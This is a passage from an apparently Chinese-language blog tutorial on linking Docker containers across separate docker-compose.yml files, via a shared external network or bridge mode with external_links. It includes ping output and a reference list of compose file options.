Compose\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4e8b\u60c5\u5c31\u66f4\u7b80\u5355\u4e86\uff0c\u8fd8\u662f\u4ee5\u4e0a\u9762\u7684 nginx \u955c\u50cf\u4e3a\u4f8b\u5b50\uff0c\u7f16\u8f91 docker-compose.yml \u6587\u4ef6\u4e3a\uff1a version: \"3\" services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx \u590d\u5236\u4ee3\u7801 \u6700\u7ec8\u6548\u679c\u4e0e\u4f7f\u7528\u666e\u901a\u7684Docker\u547d\u4ee4 docker run xxxx \u5efa\u7acb\u7684\u94fe\u63a5\u5e76\u65e0\u533a\u522b\u3002\u8fd9\u53ea\u662f\u4e00\u79cd\u6700\u4e3a\u7406\u60f3\u7684\u60c5\u51b5\u3002 \u5982\u679c\u5bb9\u5668\u6ca1\u6709\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a docker-compose.yml \u6587\u4ef6\u4e2d\uff0c\u5e94\u8be5\u5982\u4f55\u94fe\u63a5\u5b83\u4eec\u5462\uff1f \u53c8\u5982\u679c\u5b9a\u4e49\u5728 docker-compose.yml \u6587\u4ef6\u4e2d\u7684\u5bb9\u5668\u9700\u8981\u4e0e docker run xxx \u542f\u52a8\u7684\u5bb9\u5668\u94fe\u63a5\uff0c\u9700\u8981\u5982\u4f55\u5904\u7406\uff1f \u9488\u5bf9\u8fd9\u4e24\u79cd\u5178\u578b\u7684\u60c5\u51b5\uff0c\u4e0b\u9762\u7ed9\u51fa\u6211\u4e2a\u4eba\u6d4b\u8bd5\u53ef\u884c\u7684\u529e\u6cd5\uff1a \u65b9\u5f0f\u4e00\uff1a\u8ba9\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u540c\u5c5e\u4e00\u4e2a\u5916\u90e8\u7f51\u7edc \u6211\u4eec\u8fd8\u662f\u4f7f\u7528nginx\u955c\u50cf\u6765\u6a21\u62df\u8fd9\u6837\u7684\u4e00\u4e2a\u60c5\u666f\uff1a\u5047\u8bbe\u6211\u4eec\u9700\u8981\u5c06\u4e24\u4e2a\u4f7f\u7528Docker Compose\u7ba1\u7406\u7684nignx\u5bb9\u5668\uff08 test1 \u548c test2 \uff09\u94fe\u63a5\u8d77\u6765\uff0c\u4f7f\u5f97 test2 \u80fd\u591f\u8bbf\u95ee test1 \u4e2d\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5\u80fdping\u901a\u4e3a\u51c6\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5b9a\u4e49\u5bb9\u5668 test1 \u7684 docker-compose.yml \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a version: \"3\" services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true \u590d\u5236\u4ee3\u7801 \u5bb9\u5668 test2 \u5185\u5bb9\u4e0e test1 \u57fa\u672c\u4e00\u6837\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a external_links ,\u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f\uff1a \u6700\u8fd1\u53d1\u5e03\u7684Docker\u7248\u672c\u5df2\u7ecf\u4e0d\u9700\u8981\u4f7f\u7528external_links\u6765\u94fe\u63a5\u5bb9\u5668\uff0c\u5bb9\u5668\u7684DNS\u670d\u52a1\u53ef\u4ee5\u6b63\u786e\u7684\u4f5c\u51fa\u5224\u65ad \uff0c\u56e0\u6b64\u5982\u679c\u4f60\u4f60\u9700\u8981\u517c\u5bb9\u8f83\u8001\u7248\u672c\u7684Docker\u7684\u8bdd\uff0c\u90a3\u4e48\u5bb9\u5668 test2 \u7684 docker-compose.yml \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a version: \"3\" services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true\u590d\u5236\u4ee3\u7801 \u5426\u5219\u7684\u8bdd\uff0c test2 \u7684 docker-compose.yml \u548c test1 \u7684\u5b9a\u4e49\u5b8c\u5168\u4e00\u81f4\uff0c\u4e0d\u9700\u8981\u989d\u5916\u591a\u6307\u5b9a\u4e00\u4e2a external_links \u3002\u76f8\u5173\u7684\u95ee\u9898\u8bf7\u53c2\u89c1stackoverflow\u4e0a\u7684\u76f8\u5173\u95ee\u9898\uff1a docker-compose + external container \u6b63\u5982\u4f60\u770b\u5230\u7684\u90a3\u6837\uff0c\u8fd9\u91cc\u4e24\u4e2a\u5bb9\u5668\u7684\u5b9a\u4e49\u91cc\u90fd\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u5916\u90e8\u7f51\u7edc app_net ,\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5728\u542f\u52a8\u8fd9\u4e24\u4e2a\u5bb9\u5668\u4e4b\u524d\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u518d\u521b\u5efa\u5916\u90e8\u7f51\u7edc\uff1a docker network create app_net\u590d\u5236\u4ee3\u7801 \u4e4b\u540e\uff0c\u901a\u8fc7 docker-compose up -d \u547d\u4ee4\u542f\u52a8\u8fd9\u4e24\u4e2a\u5bb9\u5668\uff0c\u7136\u540e\u6267\u884c docker exec -it test2 ping test1 ,\u4f60\u5c06\u4f1a\u770b\u5230\u5982\u4e0b\u7684\u8f93\u51fa\uff1a docker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms \u590d\u5236\u4ee3\u7801 \u8bc1\u660e\u8fd9\u4e24\u4e2a\u5bb9\u5668\u662f\u6210\u529f\u94fe\u63a5\u4e86\uff0c\u53cd\u8fc7\u6765\u5728 test1 \u4e2dping test2 \u4e5f\u662f\u80fd\u591f\u6b63\u5e38ping\u901a\u7684\u3002 \u5982\u679c\u6211\u4eec\u901a\u8fc7 docker run --rm --name test3 -d nginx \u8fd9\u79cd\u65b9\u5f0f\u6765\u5148\u542f\u52a8\u4e86\u4e00\u4e2a\u5bb9\u5668( test3 )\u5e76\u4e14\u6ca1\u6709\u6307\u5b9a\u5b83\u6240\u5c5e\u7684\u5916\u90e8\u7f51\u7edc\uff0c\u800c\u9700\u8981\u5c06\u5176\u4e0e test1 \u6216\u8005 test2 \u94fe\u63a5\u7684\u8bdd\uff0c\u8fd9\u4e2a\u65f6\u5019\u624b\u52a8\u94fe\u63a5\u5916\u90e8\u7f51\u7edc\u5373\u53ef\uff1a docker network connect app_net test3\u590d\u5236\u4ee3\u7801 \u8fd9\u6837\uff0c\u4e09\u4e2a\u5bb9\u5668\u90fd\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\u4e86\u3002 \u65b9\u5f0f\u4e8c\uff1a\u66f4\u6539\u9700\u8981\u94fe\u63a5\u7684\u5bb9\u5668\u7684\u7f51\u7edc\u6a21\u5f0f \u901a\u8fc7\u66f4\u6539\u4f60\u60f3\u8981\u76f8\u4e92\u94fe\u63a5\u7684\u5bb9\u5668\u7684\u7f51\u7edc\u6a21\u5f0f\u4e3a bridge ,\u5e76\u6307\u5b9a\u9700\u8981\u94fe\u63a5\u7684\u5916\u90e8\u5bb9\u5668\uff08 external_links )\u5373\u53ef\u3002\u4e0e\u540c\u5c5e\u5916\u90e8\u7f51\u7edc\u7684\u5bb9\u5668\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\u7684\u94fe\u63a5\u65b9\u5f0f\u4e00\u4e0d\u540c\uff0c\u8fd9\u79cd\u65b9\u5f0f\u7684\u8bbf\u95ee\u662f\u5355\u5411\u7684\u3002 \u8fd8\u662f\u4ee5nginx\u5bb9\u5668\u955c\u50cf\u4e3a\u4f8b\u5b50\uff0c\u5982\u679c\u5bb9\u5668\u5b9e\u4f8b nginx1 \u9700\u8981\u8bbf\u95ee\u5bb9\u5668\u5b9e\u4f8b nginx2 \uff0c\u90a3\u4e48 nginx2 \u7684 doker-compose.yml \u5b9a\u4e49\u4e3a\uff1a version: \"3\" services: nginx2: image: nginx container_name: nginx2 network_mode: bridge \u590d\u5236\u4ee3\u7801 \u4e0e\u5176\u5bf9\u5e94\u7684\uff0c nginx1 \u7684 docker-compose.yml \u5b9a\u4e49\u4e3a\uff1a version: \"3\" services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge \u590d\u5236\u4ee3\u7801 \u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f\uff0c\u8fd9\u91cc\u7684 external_links \u662f\u4e0d\u80fd\u7701\u7565\u7684\uff0c\u800c\u4e14 nginx1 \u7684\u542f\u52a8\u5fc5\u987b\u8981\u5728 nginx2 \u4e4b\u540e\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u62a5\u627e\u4e0d\u5230\u5bb9\u5668 nginx2 \u7684\u9519\u8bef\u3002 \u63a5\u7740\u6211\u4eec\u4f7f\u7528ping\u6765\u6d4b\u8bd5\u4e0b\u8fde\u901a\u6027\uff1a $ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host\u590d\u5236\u4ee3\u7801 \u4ee5\u4e0a\u4e5f\u80fd\u5145\u5206\u8bc1\u660e\u8fd9\u79cd\u65b9\u5f0f\u662f\u5c5e\u4e8e\u5355\u5411\u8054\u901a\u7684\u3002 \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u7075\u6d3b\u7684\u9009\u62e9\u8fd9\u4e24\u79cd\u94fe\u63a5\u65b9\u5f0f\uff0c\u5982\u679c\u60f3\u5077\u61d2\u7684\u8bdd\uff0c\u5927\u53ef\u9009\u62e9\u7b2c\u4e8c\u79cd\u3002\u4e0d\u8fc7\u6211\u66f4\u63a8\u8350\u7b2c\u4e00\u79cd\uff0c\u4e0d\u96be\u770b\u51fa\u65e0\u8bba\u662f\u8054\u901a\u6027\u8fd8\u662f\u7075\u6d3b\u6027\uff0c\u8f83\u4e3a\u66f4\u6539\u7f51\u7edc\u6a21\u5f0f\u7684\u7b2c\u4e8c\u79cd\u90fd\u66f4\u4e3a\u53cb\u597d\u3002 \u9644docker-compose.yml\u6587\u4ef6\u8be6\u89e3 Compose\u548cDocker\u517c\u5bb9\u6027\uff1a Compose \u6587\u4ef6\u683c\u5f0f\u67093\u4e2a\u7248\u672c,\u5206\u522b\u4e3a1, 2.x \u548c 3.x \u76ee\u524d\u4e3b\u6d41\u7684\u4e3a 3.x \u5176\u652f\u6301 docker 1.13.0 \u53ca\u5176\u4ee5\u4e0a\u7684\u7248\u672c \u5e38\u7528\u53c2\u6570\uff1a version # \u6307\u5b9a compose \u6587\u4ef6\u7684\u7248\u672c services # \u5b9a\u4e49\u6240\u6709\u7684 service \u4fe1\u606f, services \u4e0b\u9762\u7684\u7b2c\u4e00\u7ea7\u522b\u7684 key \u65e2\u662f\u4e00\u4e2a service \u7684\u540d\u79f0 build # \u6307\u5b9a\u5305\u542b\u6784\u5efa\u4e0a\u4e0b\u6587\u7684\u8def\u5f84, \u6216\u4f5c\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u5177\u6709 context \u548c\u6307\u5b9a\u7684 dockerfile \u6587\u4ef6\u4ee5\u53ca args \u53c2\u6570\u503c context # context: \u6307\u5b9a Dockerfile \u6587\u4ef6\u6240\u5728\u7684\u8def\u5f84 dockerfile # dockerfile: \u6307\u5b9a context \u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u9762\u7684 Dockerfile \u7684\u540d\u79f0(\u9ed8\u8ba4\u4e3a Dockerfile) args # args: Dockerfile \u5728 build \u8fc7\u7a0b\u4e2d\u9700\u8981\u7684\u53c2\u6570 (\u7b49\u540c\u4e8e docker container build --build-arg \u7684\u4f5c\u7528) cache_from # v3.2\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u6307\u5b9a\u7f13\u5b58\u7684\u955c\u50cf\u5217\u8868 (\u7b49\u540c\u4e8e docker container build --cache_from \u7684\u4f5c\u7528) labels # v3.3\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u8bbe\u7f6e\u955c\u50cf\u7684\u5143\u6570\u636e (\u7b49\u540c\u4e8e docker container build --labels \u7684\u4f5c\u7528) shm_size # v3.5\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u8bbe\u7f6e\u5bb9\u5668 /dev/shm \u5206\u533a\u7684\u5927\u5c0f (\u7b49\u540c\u4e8e docker container build --shm-size \u7684\u4f5c\u7528) command # \u8986\u76d6\u5bb9\u5668\u542f\u52a8\u540e\u9ed8\u8ba4\u6267\u884c\u7684\u547d\u4ee4, \u652f\u6301 shell \u683c\u5f0f\u548c [] \u683c\u5f0f configs # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 cgroup_parent # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 container_name # \u6307\u5b9a\u5bb9\u5668\u7684\u540d\u79f0 (\u7b49\u540c\u4e8e docker run --name \u7684\u4f5c\u7528) credential_spec # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 deploy # v3 \u7248\u672c\u4ee5\u4e0a, \u6307\u5b9a\u4e0e\u90e8\u7f72\u548c\u8fd0\u884c\u670d\u52a1\u76f8\u5173\u7684\u914d\u7f6e, deploy \u90e8\u5206\u662f docker stack \u4f7f\u7528\u7684, docker stack \u4f9d\u8d56 docker swarm endpoint_mode # v3.3 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u529f\u80fd, \u6307\u5b9a\u670d\u52a1\u66b4\u9732\u7684\u65b9\u5f0f vip # Docker \u4e3a\u8be5\u670d\u52a1\u5206\u914d\u4e86\u4e00\u4e2a\u865a\u62df IP(VIP), \u4f5c\u4e3a\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u670d\u52a1\u7684\u5730\u5740 dnsrr # DNS\u8f6e\u8be2, Docker \u4e3a\u8be5\u670d\u52a1\u8bbe\u7f6e DNS \u6761\u76ee, \u4f7f\u5f97\u670d\u52a1\u540d\u79f0\u7684 DNS \u67e5\u8be2\u8fd4\u56de\u4e00\u4e2a IP \u5730\u5740\u5217\u8868, \u5ba2\u6237\u7aef\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u4e00\u4e2a\u5730\u5740 labels # \u6307\u5b9a\u670d\u52a1\u7684\u6807\u7b7e\uff0c\u8fd9\u4e9b\u6807\u7b7e\u4ec5\u5728\u670d\u52a1\u4e0a\u8bbe\u7f6e mode # \u6307\u5b9a deploy \u7684\u6a21\u5f0f global # \u6bcf\u4e2a\u96c6\u7fa4\u8282\u70b9\u90fd\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668 replicated # \u7528\u6237\u53ef\u4ee5\u6307\u5b9a\u96c6\u7fa4\u4e2d\u5bb9\u5668\u7684\u6570\u91cf(\u9ed8\u8ba4) placement # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 replicas # deploy \u7684 mode \u4e3a replicated \u65f6, \u6307\u5b9a\u5bb9\u5668\u526f\u672c\u7684\u6570\u91cf resources # \u8d44\u6e90\u9650\u5236 limits # \u8bbe\u7f6e\u5bb9\u5668\u7684\u8d44\u6e90\u9650\u5236 cpus: \"0.5\" # \u8bbe\u7f6e\u8be5\u5bb9\u5668\u6700\u591a\u53ea\u80fd\u4f7f\u7528 50% \u7684 CPU memory: 50M # \u8bbe\u7f6e\u8be5\u5bb9\u5668\u6700\u591a\u53ea\u80fd\u4f7f\u7528 50M \u7684\u5185\u5b58\u7a7a\u95f4 reservations # \u8bbe\u7f6e\u4e3a\u5bb9\u5668\u9884\u7559\u7684\u7cfb\u7edf\u8d44\u6e90(\u968f\u65f6\u53ef\u7528) cpus: \"0.2\" # \u4e3a\u8be5\u5bb9\u5668\u4fdd\u7559 20% \u7684 CPU memory: 20M # \u4e3a\u8be5\u5bb9\u5668\u4fdd\u7559 20M \u7684\u5185\u5b58\u7a7a\u95f4 restart_policy # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565, \u7528\u4e8e\u4ee3\u66ff restart \u53c2\u6570 condition # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565(\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570) none # \u4e0d\u5c1d\u8bd5\u91cd\u542f on-failure # \u53ea\u6709\u5f53\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u95ee\u9898\u624d\u4f1a\u91cd\u542f any # \u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u5c1d\u8bd5\u91cd\u542f(\u9ed8\u8ba4) delay # \u5c1d\u8bd5\u91cd\u542f\u7684\u95f4\u9694\u65f6\u95f4(\u9ed8\u8ba4\u4e3a 0s) max_attempts # \u5c1d\u8bd5\u91cd\u542f\u6b21\u6570(\u9ed8\u8ba4\u4e00\u76f4\u5c1d\u8bd5\u91cd\u542f) window # \u68c0\u67e5\u91cd\u542f\u662f\u5426\u6210\u529f\u4e4b\u524d\u7684\u7b49\u5f85\u65f6\u95f4(\u5373\u5982\u679c\u5bb9\u5668\u542f\u52a8\u4e86, \u9694\u591a\u5c11\u79d2\u4e4b\u540e\u53bb\u68c0\u6d4b\u5bb9\u5668\u662f\u5426\u6b63\u5e38, \u9ed8\u8ba4 0s) update_config # \u7528\u4e8e\u914d\u7f6e\u6eda\u52a8\u66f4\u65b0\u914d\u7f6e parallelism # \u4e00\u6b21\u6027\u66f4\u65b0\u7684\u5bb9\u5668\u6570\u91cf delay # \u66f4\u65b0\u4e00\u7ec4\u5bb9\u5668\u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4 failure_action # \u5b9a\u4e49\u66f4\u65b0\u5931\u8d25\u7684\u7b56\u7565 continue # \u7ee7\u7eed\u66f4\u65b0 rollback # \u56de\u6eda\u66f4\u65b0 pause # \u6682\u505c\u66f4\u65b0(\u9ed8\u8ba4) monitor # \u6bcf\u6b21\u66f4\u65b0\u540e\u7684\u6301\u7eed\u65f6\u95f4\u4ee5\u76d1\u89c6\u66f4\u65b0\u662f\u5426\u5931\u8d25(\u5355\u4f4d: ns|us|ms|s|m|h) (\u9ed8\u8ba4\u4e3a0) max_failure_ratio # \u56de\u6eda\u671f\u95f4\u5bb9\u5fcd\u7684\u5931\u8d25\u7387(\u9ed8\u8ba4\u503c\u4e3a0) order # v3.4 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u56de\u6eda\u671f\u95f4\u7684\u64cd\u4f5c\u987a\u5e8f stop-first #\u65e7\u4efb\u52a1\u5728\u542f\u52a8\u65b0\u4efb\u52a1\u4e4b\u524d\u505c\u6b62(\u9ed8\u8ba4) start-first #\u9996\u5148\u542f\u52a8\u65b0\u4efb\u52a1, \u5e76\u4e14\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6682\u65f6\u91cd\u53e0 rollback_config # v3.7 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u7528\u4e8e\u5b9a\u4e49\u5728 update_config \u66f4\u65b0\u5931\u8d25\u7684\u56de\u6eda\u7b56\u7565 parallelism # \u4e00\u6b21\u56de\u6eda\u7684\u5bb9\u5668\u6570, \u5982\u679c\u8bbe\u7f6e\u4e3a0, \u5219\u6240\u6709\u5bb9\u5668\u540c\u65f6\u56de\u6eda delay # \u6bcf\u4e2a\u7ec4\u56de\u6eda\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694(\u9ed8\u8ba4\u4e3a0) failure_action # \u5b9a\u4e49\u56de\u6eda\u5931\u8d25\u7684\u7b56\u7565 continue # \u7ee7\u7eed\u56de\u6eda pause # \u6682\u505c\u56de\u6eda monitor # \u6bcf\u6b21\u56de\u6eda\u4efb\u52a1\u540e\u7684\u6301\u7eed\u65f6\u95f4\u4ee5\u76d1\u89c6\u5931\u8d25(\u5355\u4f4d: ns|us|ms|s|m|h) (\u9ed8\u8ba4\u4e3a0) max_failure_ratio # \u56de\u6eda\u671f\u95f4\u5bb9\u5fcd\u7684\u5931\u8d25\u7387(\u9ed8\u8ba4\u503c0) order # \u56de\u6eda\u671f\u95f4\u7684\u64cd\u4f5c\u987a\u5e8f stop-first # \u65e7\u4efb\u52a1\u5728\u542f\u52a8\u65b0\u4efb\u52a1\u4e4b\u524d\u505c\u6b62(\u9ed8\u8ba4) start-first # \u9996\u5148\u542f\u52a8\u65b0\u4efb\u52a1, \u5e76\u4e14\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6682\u65f6\u91cd\u53e0 \u6ce8\u610f\uff1a \u652f\u6301 docker-compose up \u548c docker-compose run \u4f46\u4e0d\u652f\u6301 docker stack deploy \u7684\u5b50\u9009\u9879 security_opt container_name devices tmpfs stop_signal links cgroup_parent network_mode external_links restart build userns_mode sysctls devices # \u6307\u5b9a\u8bbe\u5907\u6620\u5c04\u5217\u8868 (\u7b49\u540c\u4e8e docker run --device \u7684\u4f5c\u7528) depends_on # \u5b9a\u4e49\u5bb9\u5668\u542f\u52a8\u987a\u5e8f (\u6b64\u9009\u9879\u89e3\u51b3\u4e86\u5bb9\u5668\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c \u6b64\u9009\u9879\u5728 v3 \u7248\u672c\u4e2d \u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) \u793a\u4f8b\uff1a docker-compose up \u4ee5\u4f9d\u8d56\u987a\u5e8f\u542f\u52a8\u670d\u52a1\uff0c\u4e0b\u9762\u4f8b\u5b50\u4e2d redis \u548c db \u670d\u52a1\u5728 web \u542f\u52a8\u524d\u542f\u52a8 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 docker-compose up web \u8fd9\u6837\u7684\u65b9\u5f0f\u542f\u52a8 web \u670d\u52a1\u65f6\uff0c\u4e5f\u4f1a\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u56e0\u4e3a\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u4f9d\u8d56\u5173\u7cfb version: '3' services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres dns # \u8bbe\u7f6e DNS \u5730\u5740(\u7b49\u540c\u4e8e docker run --dns \u7684\u4f5c\u7528) dns_search # \u8bbe\u7f6e DNS \u641c\u7d22\u57df(\u7b49\u540c\u4e8e docker run --dns-search \u7684\u4f5c\u7528) tmpfs # v2 \u7248\u672c\u4ee5\u4e0a, \u6302\u8f7d\u76ee\u5f55\u5230\u5bb9\u5668\u4e2d, \u4f5c\u4e3a\u5bb9\u5668\u7684\u4e34\u65f6\u6587\u4ef6\u7cfb\u7edf(\u7b49\u540c\u4e8e docker run --tmpfs \u7684\u4f5c\u7528, \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) entrypoint # \u8986\u76d6\u5bb9\u5668\u7684\u9ed8\u8ba4 entrypoint \u6307\u4ee4 (\u7b49\u540c\u4e8e docker run --entrypoint \u7684\u4f5c\u7528) env_file # \u4ece\u6307\u5b9a\u6587\u4ef6\u4e2d\u8bfb\u53d6\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5bb9\u5668\u4e2d\u7684\u73af\u5883\u53d8\u91cf, \u53ef\u4ee5\u662f\u5355\u4e2a\u503c\u6216\u8005\u4e00\u4e2a\u6587\u4ef6\u5217\u8868, \u5982\u679c\u591a\u4e2a\u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\u91cd\u540d\u5219\u540e\u9762\u7684\u53d8\u91cf\u8986\u76d6\u524d\u9762\u7684\u53d8\u91cf, environment \u7684\u503c\u8986\u76d6 env_file \u7684\u503c \u6587\u4ef6\u683c\u5f0f\uff1a RACK_ENV=development environment # \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c environment \u7684\u503c\u53ef\u4ee5\u8986\u76d6 env_file \u7684\u503c (\u7b49\u540c\u4e8e docker run --env \u7684\u4f5c\u7528) expose # \u66b4\u9732\u7aef\u53e3, \u4f46\u662f\u4e0d\u80fd\u548c\u5bbf\u4e3b\u673a\u5efa\u7acb\u6620\u5c04\u5173\u7cfb, \u7c7b\u4f3c\u4e8e Dockerfile \u7684 EXPOSE \u6307\u4ee4 external_links # \u8fde\u63a5\u4e0d\u5728 docker-compose.yml \u4e2d\u5b9a\u4e49\u7684\u5bb9\u5668\u6216\u8005\u4e0d\u5728 compose \u7ba1\u7406\u7684\u5bb9\u5668(docker run \u542f\u52a8\u7684\u5bb9\u5668, \u5728 v3 \u7248\u672c\u4e2d\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) extra_hosts # \u6dfb\u52a0 host \u8bb0\u5f55\u5230\u5bb9\u5668\u4e2d\u7684 /etc/hosts \u4e2d (\u7b49\u540c\u4e8e docker run --add-host \u7684\u4f5c\u7528) healthcheck # v2.1 \u4ee5\u4e0a\u7248\u672c, \u5b9a\u4e49\u5bb9\u5668\u5065\u5eb7\u72b6\u6001\u68c0\u67e5, \u7c7b\u4f3c\u4e8e Dockerfile \u7684 HEALTHCHECK \u6307\u4ee4 test # \u68c0\u67e5\u5bb9\u5668\u68c0\u67e5\u72b6\u6001\u7684\u547d\u4ee4, \u8be5\u9009\u9879\u5fc5\u987b\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216\u8005\u5217\u8868, \u7b2c\u4e00\u9879\u5fc5\u987b\u662f NONE, CMD \u6216 CMD-SHELL, \u5982\u679c\u5176\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u5219\u76f8\u5f53\u4e8e CMD-SHELL \u52a0\u8be5\u5b57\u7b26\u4e32 NONE # \u7981\u7528\u5bb9\u5668\u7684\u5065\u5eb7\u72b6\u6001\u68c0\u6d4b CMD # test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] CMD-SHELL # test: [\"CMD-SHELL\", \"curl -f http://localhost || exit 1\"] \u6216\u8005\u3000test: curl -f https://localhost || exit 1 interval: 1m30s # \u6bcf\u6b21\u68c0\u67e5\u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4 timeout: 10s # \u8fd0\u884c\u547d\u4ee4\u7684\u8d85\u65f6\u65f6\u95f4 retries: 3 # \u91cd\u8bd5\u6b21\u6570 start_period: 40s # v3.4 \u4ee5\u4e0a\u65b0\u589e\u7684\u9009\u9879, \u5b9a\u4e49\u5bb9\u5668\u542f\u52a8\u65f6\u95f4\u95f4\u9694 disable: true # true \u6216 false, \u8868\u793a\u662f\u5426\u7981\u7528\u5065\u5eb7\u72b6\u6001\u68c0\u6d4b\u548c\u3000test: NONE \u76f8\u540c image # \u6307\u5b9a docker \u955c\u50cf, \u53ef\u4ee5\u662f\u8fdc\u7a0b\u4ed3\u5e93\u955c\u50cf\u3001\u672c\u5730\u955c\u50cf init # v3.7 \u4e2d\u65b0\u589e\u7684\u53c2\u6570, true \u6216 false \u8868\u793a\u662f\u5426\u5728\u5bb9\u5668\u4e2d\u8fd0\u884c\u4e00\u4e2a init, \u5b83\u63a5\u6536\u4fe1\u53f7\u5e76\u4f20\u9012\u7ed9\u8fdb\u7a0b isolation # \u9694\u79bb\u5bb9\u5668\u6280\u672f, \u5728 Linux \u4e2d\u4ec5\u652f\u6301 default \u503c labels # \u4f7f\u7528 Docker \u6807\u7b7e\u5c06\u5143\u6570\u636e\u6dfb\u52a0\u5230\u5bb9\u5668, \u4e0e Dockerfile \u4e2d\u7684 LABELS \u7c7b\u4f3c links # \u94fe\u63a5\u5230\u5176\u5b83\u670d\u52a1\u4e2d\u7684\u5bb9\u5668, \u8be5\u9009\u9879\u662f docker \u5386\u53f2\u9057\u7559\u7684\u9009\u9879, \u76ee\u524d\u5df2\u88ab\u7528\u6237\u81ea\u5b9a\u4e49\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u53d6\u4ee3, \u6700\u7ec8\u6709\u53ef\u80fd\u88ab\u5e9f\u5f03 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) logging # \u8bbe\u7f6e\u5bb9\u5668\u65e5\u5fd7\u670d\u52a1 driver # \u6307\u5b9a\u65e5\u5fd7\u8bb0\u5f55\u9a71\u52a8\u7a0b\u5e8f, \u9ed8\u8ba4 json-file (\u7b49\u540c\u4e8e docker run --log-driver \u7684\u4f5c\u7528) options # \u6307\u5b9a\u65e5\u5fd7\u7684\u76f8\u5173\u53c2\u6570 (\u7b49\u540c\u4e8e docker run --log-opt \u7684\u4f5c\u7528) max-size # \u8bbe\u7f6e\u5355\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f, \u5f53\u5230\u8fbe\u8fd9\u4e2a\u503c\u540e\u4f1a\u8fdb\u884c\u65e5\u5fd7\u6eda\u52a8\u64cd\u4f5c max-file # \u65e5\u5fd7\u6587\u4ef6\u4fdd\u7559\u7684\u6570\u91cf 